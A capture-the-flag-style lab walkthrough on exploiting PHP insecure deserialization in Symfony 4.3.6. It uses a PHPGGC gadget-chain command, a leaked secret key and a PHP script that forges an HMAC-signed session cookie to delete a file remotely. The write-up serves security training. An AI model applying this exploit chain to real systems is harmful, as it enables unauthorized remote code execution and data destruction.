# Exploiting PHP deserialization with a pre-built gadget chain
* This lab has a serialization based session mechanism that uses a signed cookie. it also uses a commom PHP framework. Although you don't have source code access, you can still exploit this lab's insecure deserialization using pre-built gadget chains.
	* To solve this labe, identify the target framework then use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, work out how to generate a valid signed cookie containing your malicious object.
	* Finally, pass this into the website to delete the `morale.txt` file from Carlos's home directory.
	* You can log in to your own account using the following credentials `wiener:peter`

### 1. Enumerate the serialization based session cookie
* Login as _wiener_ and enumerate the session cookie.

![24](https://user-images.githubusercontent.com/53956303/154774984-d8c2851b-4ccb-417f-a8f0-598f2b351ec8.png)
* the cookie contains a base64-encoded token, signed with a SHA-1 HMAC hash.
	* Using the Burp inspector to decode the _Token_

![25](https://user-images.githubusercontent.com/53956303/154775156-751c6520-ec4d-473a-8076-fcc39bf62a79.png)
* Also from the resposne, a file path `/cgi-bin/php.info.php` is found from the developers' comment.

![27](https://user-images.githubusercontent.com/53956303/154775386-9cffd6ea-f1d6-461f-a3f3-9f20fc76c268.png)
### 2. Try to send a request with an invalid cookie
![image](https://user-images.githubusercontent.com/53956303/154775477-713bb3b5-9fdf-41f6-b248-5cd8c21c2470.png)
* The response revealed the application version information
	* `Symfony Version: 4.3.6`

### 3. Enumerate `/cgi-bin/phpinfo.php`
* Send the request for enumeration. From the page, a `SECRET_KEY: 0snnrcizqjvgzi2pg38ug73b6w4ffstb` is found

![29](https://user-images.githubusercontent.com/53956303/154775701-71dcdc15-974a-49d0-9128-104a55cd9034.png)
### 4. Use PHPGGC tool to generate a based64 encoded payload
```bash
./opt/phpggc symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w 0
```
* It generates a base64-encoded serialized object that exploits an RCE gadget chain in Symfony to delete the target file.

### 5. Construct a valid cookie containing the malicious paylod
* Using the secret key and generated payload to construct.
```php
<?php
$object = "Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==";
$secretKey = "0snnrcizqjvgzi2pg38ug73b6w4ffstb";
$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
echo $cookie;
?>
```
![31](https://user-images.githubusercontent.com/53956303/154776191-884df862-36b7-48b7-ac76-817598dcc5c8.png)
* Execute the constructor
```bash
php construct.php
```
* As a result, a perfectly constructed cookie is given.

![32](https://user-images.githubusercontent.com/53956303/154776542-f02cdbd0-a356-4776-b89a-7fc5edbaa7c5.png)
### 6. Replace the cookie with the generate malious cookie and send the request
![33](https://user-images.githubusercontent.com/53956303/154776597-e62f27b9-a54d-415c-a619-6cf6821bceef.png)
* As a result, the response gives 500 Internal server error, but the target file is successfully deleted.
	* The lab is solved.

![34](https://user-images.githubusercontent.com/53956303/154776668-97294cb3-264f-412c-bd52-5172bfd7093a.png)
